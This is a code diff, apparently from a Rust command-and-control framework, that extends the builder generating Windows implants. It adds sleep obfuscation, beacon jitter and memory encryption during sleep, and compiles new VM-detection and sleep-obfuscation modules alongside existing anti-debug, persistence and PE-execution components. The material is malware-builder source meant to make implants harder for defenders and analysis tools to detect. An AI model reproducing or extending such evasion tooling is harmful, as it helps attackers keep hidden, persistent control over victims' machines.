@@ -20,6 +20,9 @@ pub struct AgentConfig {
     pub anti_vm: bool,
     pub anti_debug: bool,
     pub headers: Vec<(String, String)>,
+    pub use_sleep_obfuscation: u32,
+    pub sleep_jitter_percent: f32,
+    pub encrypt_memory_on_sleep: bool,
 }
 // -------------------------------------------------------
 
@@ -238,6 +241,18 @@ impl AgentHandler {
         log::info!("    - Anti-Debug: {}", config.anti_debug);
         log::info!("    - Anti-VM: {}", config.anti_vm);
         log::info!("    - USE_HTTPS: {}", use_https);
+        log::info!(
+            "    - USE_SLEEP_OBFUSCATION: {}",
+            config.use_sleep_obfuscation
+        );
+        log::info!(
+            "    - SLEEP_JITTER_PERCENT: {}",
+            config.sleep_jitter_percent
+        );
+        log::info!(
+            "    - ENCRYPT_MEMORY_ON_SLEEP: {}",
+            config.encrypt_memory_on_sleep
+        );
 
         let new_agent_config = format!(
             r#"#pragma once
@@ -253,6 +268,9 @@ constexpr int BEACON_INTERVAL = {};
 constexpr bool ANTI_DEBUG_ENABLED = {};
 constexpr bool ANTI_VM_ENABLED = {};
 constexpr bool USE_HTTPS = {};
+constexpr int USE_SLEEP_OBFUSCATION = {};
+constexpr float SLEEP_JITTER_PERCENT = {};
+constexpr bool ENCRYPT_MEMORY_ON_SLEEP = {};
 "#,
             listener_name,
             listener.xor_key,
@@ -265,6 +283,9 @@ constexpr bool USE_HTTPS = {};
             if config.anti_debug { "true" } else { "false" },
             if config.anti_vm { "true" } else { "false" },
             if use_https { "true" } else { "false" },
+            config.use_sleep_obfuscation,
+            config.sleep_jitter_percent,
+            config.encrypt_memory_on_sleep,
         );
         let cwd = env::current_dir().map_err(|e| format!("Cannot get current directory: {}", e))?;
 
@@ -303,6 +324,8 @@ constexpr bool USE_HTTPS = {};
                 {p}/pe-exec.cpp \
                 {p}/persistence.cpp \
                 {p}/debug_detection.cpp \
+                {p}/vm_detection.cpp \
+                {p}/sleep_obfuscation.cpp \
                 -lwininet -lpsapi -lshlwapi -lole32 -lshell32 -static-libstdc++ -static-libgcc -lws2_32",
             dll = dll_path,
             p = agent_path_str
@@ -379,6 +402,18 @@ constexpr bool USE_HTTPS = {};
         log::info!("    - Beacon Interval: {}s", config.beacon_interval);
         log::info!("    - Anti-VM: {}", config.anti_vm);
         log::info!("    - Anti-Debug: {}", config.anti_debug);
+        log::info!(
+            "    - USE_SLEEP_OBFUSCATION: {}",
+            config.use_sleep_obfuscation
+        );
+        log::info!(
+            "    - SLEEP_JITTER_PERCENT: {}",
+            config.sleep_jitter_percent
+        );
+        log::info!(
+            "    - ENCRYPT_MEMORY_ON_SLEEP: {}",
+            config.encrypt_memory_on_sleep
+        );
         log::info!("    - USE_HTTPS: {}", use_https);
 
         let new_agent_config = format!(
@@ -395,6 +430,9 @@ constexpr int BEACON_INTERVAL = {};
 constexpr bool ANTI_DEBUG_ENABLED = {};
 constexpr bool ANTI_VM_ENABLED = {};
 constexpr bool USE_HTTPS = {};
+constexpr int USE_SLEEP_OBFUSCATION = {};
+constexpr float SLEEP_JITTER_PERCENT = {};
+constexpr bool ENCRYPT_MEMORY_ON_SLEEP = {};
 "#,
             listener_name,
             listener.xor_key,
@@ -407,6 +445,9 @@ constexpr bool USE_HTTPS = {};
             if config.anti_debug { "true" } else { "false" },
             if config.anti_vm { "true" } else { "false" },
             if use_https { "true" } else { "false" },
+            config.use_sleep_obfuscation,
+            config.sleep_jitter_percent,
+            config.encrypt_memory_on_sleep,
         );
 
         let cwd = env::current_dir().map_err(|e| format!("Cannot get current directory: {}", e))?;
@@ -447,6 +488,7 @@ constexpr bool USE_HTTPS = {};
                 {p}/persistence.cpp \
                 {p}/debug_detection.cpp \
                 {p}/vm_detection.cpp \
+                {p}/sleep_obfuscation.cpp \
                 -lwininet -lpsapi -lshlwapi -lole32 -lshell32 -static-libstdc++ -static-libgcc -lws2_32",
             exe = exe_path,
             p = agent_path_str
